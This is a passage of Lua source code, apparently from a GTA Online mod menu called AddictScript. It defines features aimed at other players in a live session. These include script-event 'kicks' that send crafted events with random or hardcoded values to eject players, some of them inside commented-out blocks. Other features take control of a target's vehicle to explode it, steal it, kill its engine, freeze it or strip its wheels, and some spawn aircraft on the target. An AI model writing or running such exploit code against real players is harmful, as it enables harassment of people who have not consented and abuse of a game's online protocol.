			script.trigger_script_event(0x37437C28, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 2 then
			script.trigger_script_event(-1308840134, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 3 then
			script.trigger_script_event(0x4E0350C6, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 4 then
			script.trigger_script_event(-0x15F5B1D4, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 5 then
			script.trigger_script_event(-0x249FE11B, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 6 then
			script.trigger_script_event(-0x76B11968, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 7 then
			script.trigger_script_event(0x493FC6BB, pid, {player.player_id(), script_func.get_global_main(pid)})
		elseif f.value == 8 then
			script.trigger_script_event(0xF5F36157, pid, {player.player_id(), math.random(32, 2147483647), math.random(-2147483647, 2147483647), 1, 115, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		elseif f.value == 9 then
			script.trigger_script_event(1757755807, pid, {player.player_id(), math.random(-2147483647, 2147483647), pid})
		elseif f.value == 10 then
			script.trigger_script_event(-1991317864, pid, {player.player_id(), -1, -1, -1, -1})
		elseif f.value == 11 then
			script.trigger_script_event(-614457627, pid, {player.player_id(), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10), math.random(-2147483647, -10)})
		elseif f.value == 12 then
			script.trigger_script_event(-569621836, pid, {player.player_id(), 13644241, 505873})
		elseif f.value == 13 then
			script.trigger_script_event(-227800145, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), 2361235669, math.random(-2147483647, 2147483647), 263261, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), 215132521, 5262462321, math.random(-2147483647, 2147483647), pid})
		end
		menu.notify("Script Event Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"v1",
	"v2",
	"v3",
	"v4",
	"v5",
	"v6",
	"v7",
	"v8",
	"v9",
	"v10",
	"v11",
	"v12"
})

menu.add_player_feature("Kick - Jumper", "action_value_str", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if f.value == 0 then
			script.trigger_script_event(-227800145, pid, {player.player_id(), math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
		elseif f.value == 1 then
			script.trigger_script_event(69874647, pid, {player.player_id(), math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
		end
		menu.notify("Jumper Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"v1",
	"v2"
})

menu.add_player_feature("Kick - Freemode Death", "action", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(65587051, pid, {player.player_id(), pid, pid, pid, math.random(-2147483647, 2147483647), pid})
		system.wait(1)
		script.trigger_script_event(-65587051, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		system.wait(1)
		script.trigger_script_event(1116398805, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
		system.wait(1)
		script.trigger_script_event(-2113023004, pid, {-1, -1, 0, 0, -20, 1000})
		system.wait(1)
		script.trigger_script_event(-1846290480, pid, {player.player_id(), pid, 25, 0, 1242, pid})
		system.wait(1)
		for i = 1, #freemode_death_kick_se do
			script.trigger_script_event(freemode_death_kick_se[i], pid, {player.player_id(), -1, -1})
			system.wait(1)
		end
		menu.notify("Freemode Death Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)
]]
menu.add_player_feature("Kick - Smart Kick", "action", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if network.network_is_host() then
			network.network_session_kick_player(pid)
		elseif player.is_player_host(pid) and player.is_player_modder(pid, -1) then
			script_func.script_event_kick(pid)
		else
			network.force_remove_player(pid)
		end
		menu.notify("Smart Kick executed successfully.", AddictScript)
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end	
end)

menu.add_player_feature("Kick - Host Kick", "action", playerparents["Kicks"], function(f, pid)
	if player.is_player_valid(pid) then
		if network.network_is_host() then
			network.network_session_kick_player(pid)
			menu.notify("Host Kick executed successfully.", AddictScript)
		else
			menu.notify("You have to be Host in order to use this feature.", AddictScript, 3, 211)
		end
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end	
end)
--[[
playerfeature["Force TP Player"] = menu.add_player_feature("Force TP Player", "action", playerparents["Player Options"].id, function(f, pid)
	if player.is_player_valid(pid) then
		if player.player_id() ~= pid then
			if utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) > 50 then
				if player.is_player_in_any_vehicle(pid) then
					local time = utils.time_ms() + 15000
					while not network.has_control_of_entity(player.get_player_vehicle(pid)) and time > utils.time_ms() do
						system.yield(0)
						network.request_control_of_entity(player.get_player_vehicle(pid))
					end
					entity.set_entity_coords_no_offset(player.get_player_vehicle(pid), utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 5, 1))
				else
					script.trigger_script_event_2(1 << pid, ScriptEvent["Script Teleport"], player.player_id(), 1, 32, network.network_hash_from_player(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1)
					system.yield(2000)
					natives.SET_FOCUS_POS_AND_VEL(player.get_player_coords(pid), 0.0, 0.0, 0.0)
					local cam_ = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", player.get_player_coords(pid), 0.0, 0.0, 0.0, 70.0, false, false)
					natives.SET_CAM_ACTIVE(cam_, true)
					natives.RENDER_SCRIPT_CAMS(true, false, 0, false, false, false)
					local time = utils.time_ms() + 14000
					while not network.has_control_of_entity(player.get_player_vehicle(pid)) and player.is_player_valid(pid) and time > utils.time_ms() do
						system.yield(0)
						natives.SET_FOCUS_POS_AND_VEL(player.get_player_coords(pid), 0.0, 0.0, 0.0)
						natives.SET_CAM_COORD(cam_, player.get_player_coords(pid) + 10)
						natives.SET_CAM_ROT(cam_, -90, 0, 0, 2)
						network.request_control_of_entity(player.get_player_vehicle(pid))
					end
					if network.has_control_of_entity(player.get_player_vehicle(pid)) then
						local vehicle_ = player.get_player_vehicle(pid)
						entity.set_entity_coords_no_offset(player.get_player_vehicle(pid), utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 3, 1))
						natives.CLEAR_FOCUS()
						natives.SET_CAM_ACTIVE(cam_, false)
						natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
						natives.DESTROY_CAM(cam_, false)
						system.yield(1000)
						ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
						utilities.request_control(vehicle_, 4000)
						entity_func.hard_remove_entity(vehicle_)
					else
						natives.CLEAR_FOCUS()
						natives.SET_CAM_ACTIVE(cam_, false)
						natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
						natives.DESTROY_CAM(cam_, false)
						ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
						menu.notify("Failed to force player ped into a vehicle", AddictScript, 4, NotifyColours["red"])
					end
				end
			end
		end
	end
end)
]]
playerparents["Vehicle Options"] = menu.add_player_feature("Vehicle Options", "parent", playerparents["AddictScript"].id)

playerfeature["Vehicle Kick"] = menu.add_player_feature("Vehicle Kick", "action_value_str", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		if f.value == 0 then
			script.trigger_script_event(ScriptEvent["Vehicle Kick"], pid, {player.player_id(), 4294967295, 4294967295, 4294967295})
		else
			local veh = player.get_player_vehicle(pid)
			local decorexists = decorator.decor_exists_on(veh, "Player_Vehicle")
			local decorint = decorator.decor_get_int(veh, "Player_Vehicle")
			decorator.decor_set_int(veh, "Player_Vehicle", 0)
			system.yield(1000)
			if decorexists then
				decorator.decor_set_int(veh, "Player_Vehicle", decorint)
			else
				decorator.decor_remove(veh, "Player_Vehicle")
			end
		end
	end
end)
playerfeature["Vehicle Kick"]:set_str_data({"Kick", "Hard Lock"})

playerfeature["Crash Car"] = menu.add_player_feature("Crash Car", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_model(165521376)
		local object_ = object.create_object(165521376, utilities.offset_coords_forward(player.get_player_coords(pid), player.get_player_heading(pid), 5), true, false)
		entity.set_entity_rotation(object_, v3(0, 0, entity.get_entity_rotation(player.get_player_vehicle(pid)).z + 90))
		entity.set_entity_visible(object_, false)
		system.wait(2000)
		entity.delete_entity(object_)
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Kill Engine"] = menu.add_player_feature("Kill Engine", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		vehicle.set_vehicle_engine_health(player.get_player_vehicle(pid), -4000)
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Destroy Vehicle"] = menu.add_player_feature("Destroy Vehicle", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
	utilities.request_control(player.get_player_vehicle(pid))
	natives.DECOR_SET_INT(player.get_player_vehicle(pid), "Not_Allow_As_Saved_Veh", 3)
    natives.NETWORK_EXPLODE_VEHICLE(player.get_player_vehicle(pid), 0, 1);
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Yeet"] = menu.add_player_feature("Yeet", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		entity.apply_force_to_entity(player.get_player_vehicle(pid), 3, math.random(0, 360), math.random(0, 360), math.random(0, 360), math.random(0, 360), math.random(0, 360), math.random(0, 360), true, true)
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Steal Vehicle"] = menu.add_player_feature("Steal Vehicle", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		local player_vehicle = player.get_player_vehicle(pid)
		utilities.request_control(player_vehicle)
		if network.has_control_of_entity(player_vehicle) then
			utilities.request_model(0xB5CF80E4)
			ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
			local ped_ = ped.create_ped(0, 0xB5CF80E4, player.get_player_coords(pid) + v3(0, 0, 10), player.get_player_heading(pid), true, false)
			utilities.request_control_silent(ped_)
			ped.set_ped_combat_attributes(ped_, 3, false)
			ped.set_ped_into_vehicle(ped_, player_vehicle, -1)
			gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(ped_), entity.get_entity_coords(ped_), 0, gameplay.get_hash_key("weapon_pistol"), player.get_player_ped(pid), false, true, 100)
		end
	else
		menu.notify("The Player has to be in a vehicle!", AddictScript, 3, 211)
	end
end)

playerfeature["Remove Wheels"] = menu.add_player_feature("Remove Wheels", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		if vehicle.get_vehicle_wheel_count(player.get_player_vehicle(pid)) ~= nil then
			for i = 0, vehicle.get_vehicle_wheel_count(player.get_player_vehicle(pid)) do
				vehicle.set_vehicle_wheel_tire_radius(player.get_player_vehicle(pid), i, 0.0000000000000000000000000000000000001)
				vehicle.set_vehicle_wheel_render_size(player.get_player_vehicle(pid), 0)
			end
		end
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Freeze Vehicle"] = menu.add_player_feature("Freeze Vehicle", "toggle", playerparents["Vehicle Options"].id, function(f, pid)
	if f.on then
		utilities.request_control(player.get_player_vehicle(pid))
		while f.on do
			system.yield(100)
			entity.freeze_entity(player.get_player_vehicle(pid), true)
		end
	end
	if not f.on then
		utilities.request_control(player.get_player_vehicle(pid))
		entity.freeze_entity(player.get_player_vehicle(pid), false)
	end
end)

playerfeature["Freeze Vehicle V2"] = menu.add_player_feature("Freeze Vehicle V2", "toggle", playerparents["Vehicle Options"].id, function(f, pid)
    if f.on then
        if player.is_player_in_any_vehicle(pid) == true then
            while f.on do
                network.request_control_of_entity(player.get_player_vehicle(pid))
                native.call(0xC5F68BE9613E2D18, player.get_player_vehicle(pid),  1, -524452543453, -524452543453, -524452543453, -524452543453, -524452543453, -524452543453, 0, 1, 1, 1, 1, 1)
                system.wait()
            end
        else
            menu.notify("Player Is Not In Any Vehicle", "Freeze Veh")
        end
    end
end)

playerfeature["Vehicle Godmode"] = menu.add_player_feature("Vehicle Godmode", "value_str", playerparents["Vehicle Options"].id, function(f, pid)
	if f.on then
		utilities.request_control(player.get_player_vehicle(pid))
		while f.on do
			system.yield(0)
			utilities.request_control_silent(player.get_player_vehicle(pid))
			if f.value == 0 then
				entity.set_entity_god_mode(player.get_player_vehicle(pid), true)
			else
				natives.SET_ENTITY_PROOFS(player.get_player_vehicle(pid), true, true, true, true, true, true, true, true, true)
			end
		end
	end
	if not f.on then
		utilities.request_control_silent(player.get_player_vehicle(pid))
		if f.value == 0 then
			entity.set_entity_god_mode(player.get_player_vehicle(pid), false)
		else
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(pid), false, false, false, false, false, false, false, false, false)
		end
	end
end):set_str_data({"v1", "v2"})

playerfeature["Fill Vehicle With Peds"] = menu.add_player_feature("Fill Vehicle With Peds", "action", playerparents["Vehicle Options"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		local vehicle_ = player.get_player_vehicle(pid)
		utilities.request_control(vehicle_)
		if network.has_control_of_entity(vehicle_) then
			local fill_peds = {}
			for i = -1, vehicle.get_vehicle_model_number_of_seats(entity.get_entity_model_hash(vehicle_)) do
				if natives.IS_VEHICLE_SEAT_FREE(vehicle_, i, false):__tointeger() == 1 then
					local rndmmodel
					local rndint = math.random(1, 8)
					if rndint == 1 then
						rndmmodel = 1951946145
					elseif rndint == 2 then
						rndmmodel = 826475330
					elseif rndint == 3 then
						rndmmodel = 3482496489
					elseif rndint == 4 then
						rndmmodel = 1388848350
					elseif rndint == 5 then
						rndmmodel = 3512565361
					elseif rndint == 6 then
						rndmmodel = 3188223741
					elseif rndint == 7 then
						rndmmodel = 3382649284
					else
						rndmmodel = 2597531625			
					end
					utilities.request_model(rndmmodel)
					fill_peds[#fill_peds + 1] = ped.create_ped(0, rndmmodel, player.get_player_coords(pid) + v3(0, 0, 10), 0, true, false)
					network.request_control_of_entity(fill_peds[#fill_peds])
					ped.set_ped_into_vehicle(fill_peds[#fill_peds], vehicle_, i)
					ped.set_ped_combat_attributes(fill_peds[#fill_peds], 3, false)
				end
			end
		end
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Bouncy Vehicle"] = menu.add_player_feature("Bouncy Vehicle", "toggle", playerparents["Vehicle Options"].id, function(f, pid)
    while f.on do
		utilities.request_control(player.get_player_vehicle(pid))
        local vehicle_velocity = entity.get_entity_velocity(player.get_player_vehicle(pid))
        entity.set_entity_velocity(player.get_player_vehicle(pid), v3(vehicle_velocity.x, vehicle_velocity.y, vehicle_velocity.z + 2.5))
		system.yield(1000)
    end
end)

playerfeature["Anti Lock-On"] = menu.add_player_feature("Anti Lock-On", "toggle", playerparents["Vehicle Options"].id, function(f, pid)
	if f.on then
		utilities.request_control(player.get_player_vehicle(pid))
		while f.on do
			system.yield(100)
			vehicle.set_vehicle_can_be_locked_on(player.get_player_vehicle(pid), false, true)
		end
	end
	if not f.on then
		utilities.request_control(player.get_player_vehicle(pid))
		vehicle.set_vehicle_can_be_locked_on(player.get_player_vehicle(pid), true, true)
	end
end)

playerfeature["Reduce Vehicle Grip"] = menu.add_player_feature("Reduce Vehicle Grip", "toggle", playerparents["Vehicle Options"].id, function(f, pid)
	if f.on then
		utilities.request_control(player.get_player_vehicle(pid))
    	while f.on do
			vehicle.set_vehicle_reduce_grip(player.get_player_vehicle(pid), true)
			system.yield(100)
		end
    end
	if not f.on then
		utilities.request_control(player.get_player_vehicle(pid))
		vehicle.set_vehicle_reduce_grip(player.get_player_vehicle(pid), false)
	end
end)

playerfeature["Modify Vehicle Speed"] = menu.add_player_feature("Modify Vehicle Speed", "action", playerparents["Vehicle Options"].id, function(f, pid)
    if player.is_player_in_any_vehicle(pid) then
        local input_stat, input_val = input.get("Enter Speed", "", 9, 3)
        if input_stat == 1 then
            return HANDLER_CONTINUE
        end
        if input_stat == 2 then
            return HANDLER_POP
        end
		utilities.request_control(player.get_player_vehicle(pid))
        vehicle.modify_vehicle_top_speed(player.get_player_vehicle(pid), input_val / 3.6)
		entity.set_entity_max_speed(player.get_player_vehicle(pid), input_val / 3.6)
		vehicle.set_vehicle_engine_torque_multiplier_this_frame(player.get_player_vehicle(pid), input_val / 3.6)
    else
        menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
    end
end)

playerparents["Vehicle Upgrades"] = menu.add_player_feature("Vehicle Upgrades", "parent", playerparents["Vehicle Options"].id)

playerfeature["Max Vehicle"] = menu.add_player_feature("Max Vehicle", "action", playerparents["Vehicle Upgrades"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		utilities.max_vehicle(player.get_player_vehicle(pid))
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Repair Vehicle"] = menu.add_player_feature("Repair Vehicle", "action", playerparents["Vehicle Upgrades"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		vehicle.set_vehicle_undriveable(player.get_player_vehicle(pid), false)
		local entity_velocity = entity.get_entity_velocity(player.get_player_vehicle(pid))
		vehicle.set_vehicle_fixed(player.get_player_vehicle(pid))
		vehicle.set_vehicle_engine_health(player.get_player_vehicle(pid), 1000)
		vehicle.set_vehicle_engine_on(player.get_player_vehicle(pid), true, true, true)
		if entity.is_entity_on_fire(player.get_player_vehicle(pid)) then
			fire.stop_entity_fire(player.get_player_vehicle(pid))
		end
		entity.set_entity_velocity(player.get_player_vehicle(pid), entity_velocity)
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Downgrade Vehicle"] = menu.add_player_feature("Downgrade Vehicle", "action", playerparents["Vehicle Upgrades"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		utilities.downgrade_vehicle(player.get_player_vehicle(pid))
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Remove All Extras"] = menu.add_player_feature("Remove All Extras", "action", playerparents["Vehicle Upgrades"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		for i = 0, 20 do
			vehicle.set_vehicle_extra(player.get_player_vehicle(pid), i, true)
		end
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerparents["Door Control"] = menu.add_player_feature("Door Control", "parent", playerparents["Vehicle Options"].id)

playerfeature["Destroy All Vehicle Doors"] = menu.add_player_feature("Destroy All Vehicle Doors", "action", playerparents["Door Control"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		for i = 0, 8 do
			natives.SET_VEHICLE_DOOR_BROKEN(player.get_player_vehicle(pid), i, false)
		end
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Open All Vehicle Doors"] = menu.add_player_feature("Open All Vehicle Doors", "action", playerparents["Door Control"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		for i = 0, 7 do
			vehicle.set_vehicle_door_open(player.get_player_vehicle(pid), i, false, true)
		end
		system.wait(100)
		for i = 0, 7 do
			vehicle.set_vehicle_door_open(player.get_player_vehicle(pid), i, false, true)
		end
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Close All Vehicle Doors"] = menu.add_player_feature("Close All Vehicle Doors", "action", playerparents["Door Control"].id, function(f, pid)
	if player.is_player_in_any_vehicle(pid) then
		utilities.request_control(player.get_player_vehicle(pid))
		for i = 0, 7 do
			vehicle.set_vehicle_doors_shut(player.get_player_vehicle(pid), i, false, true)
		end
	else
		menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
	end
end)

playerfeature["Lock All Vehicle Doors"] = menu.add_player_feature("Lock All Vehicle Doors", "toggle", playerparents["Door Control"].id, function(f, pid)
	if f.on then
		if player.is_player_in_any_vehicle(pid) then
			utilities.request_control(player.get_player_vehicle(pid))
			vehicle.set_vehicle_doors_locked(player.get_player_vehicle(pid), 4)
		else
			menu.notify("Player is not in a vehicle", AddictScript, 3, 211)
			f.on = false
		end
	end
	if not f.on then
		vehicle.set_vehicle_doors_locked(player.get_player_vehicle(pid), 0)
	end
end)

playerparents["Air Vehicles"] = menu.add_player_feature("Air Vehicles", "parent", playerparents["Vehicle Options"].id)

playerfeature["Cargoplane"] = menu.add_player_feature("Cargoplane", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 1000
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(368211810)
    	local vehicle_ = vehicle.create_vehicle(368211810, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
   		vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(368211810)
    	local vehicle_ = vehicle.create_vehicle(368211810, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 20), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
   		vehicle.set_vehicle_forward_speed(vehicle_, 100.0)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(368211810)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Cargoplane Opened"] = menu.add_player_feature("Cargoplane Opened", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 1000
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(368211810)
    	local vehicle_ = vehicle.create_vehicle(368211810, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
   		vehicle.set_vehicle_forward_speed(vehicle_, 200.0)
		vehicle.set_vehicle_door_open(vehicle_, 2, false, false)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(368211810)
    	local vehicle_ = vehicle.create_vehicle(368211810, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 20), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
   		vehicle.set_vehicle_forward_speed(vehicle_, 200.0)
		vehicle.set_vehicle_door_open(vehicle_, 2, false, false)
	end
	streaming.set_model_as_no_longer_needed(0xE75B4B1C)
	streaming.set_model_as_no_longer_needed(368211810)
end):set_str_data({
	"Air",
	"Their Pos"
})

playerfeature["Jet"] = menu.add_player_feature("Jet", "action_value_str", playerparents["Air Vehicles"].id, function(f, pid)
	if f.value == 0 then
		local pos = player.get_player_coords(pid)
		pos.z = 1000
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(1058115860)

    	local vehicle_ = vehicle.create_vehicle(1058115860, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(math.random(-100, 100), math.random(-100, 100), 0), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
    	vehicle.set_vehicle_forward_speed(vehicle_, 200.0)
	elseif f.value == 1 then
		local pos = player.get_player_coords(pid)
    	utilities.request_model(0xE75B4B1C)
    	utilities.request_model(1058115860)
    	local vehicle_ = vehicle.create_vehicle(1058115860, pos + v3(0, 0, 5), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
    	local ped_ = ped.create_ped(1, 0xE75B4B1C, pos + v3(0, 0, 10), 1.0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
    	ped.set_ped_into_vehicle(ped_, vehicle_, -1)
    	vehicle.set_vehicle_engine_on(vehicle_, true, true, false)
    	vehicle.control_landing_gear(vehicle_, 3)
